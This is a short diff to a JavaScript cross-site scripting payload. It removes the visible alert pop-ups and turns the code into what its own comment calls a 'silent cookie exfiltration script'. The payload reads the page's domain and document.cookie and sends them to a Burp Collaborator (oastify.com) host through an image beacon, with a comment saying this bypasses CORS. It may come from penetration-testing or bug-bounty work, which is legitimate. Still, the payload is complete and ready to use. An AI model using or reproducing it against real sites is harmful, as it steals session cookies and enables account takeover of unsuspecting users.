@@ -1,13 +1,12 @@
-// Display the current domain in an alert
-alert("Domain: " + document.domain);
+// Silent cookie exfiltration script
 
-// Fetch the cookies
+// Get document domain and cookies
+var domain = document.domain;
 var cookies = document.cookie;
 
-// Display the cookies in an alert
-alert("Cookies: " + cookies);
+// Define your Burp Collaborator endpoint
+var exfilURL = "https://evd6ijg72o74ri9ne2kpold5hwnnblza.oastify.com";
 
-// Send the cookies to your Burp Collaborator URL
-var burpCollaboratorURL = "https://evd6ijg72o74ri9ne2kpold5hwnnblza.oastify.com"; // Replace with your actual Burp Collaborator URL
+// Send via image beacon (bypasses CORS)
 var img = new Image();
-img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
+img.src = exfilURL + "/?domain=" + encodeURIComponent(domain) + "&cookie=" + encodeURIComponent(cookies);
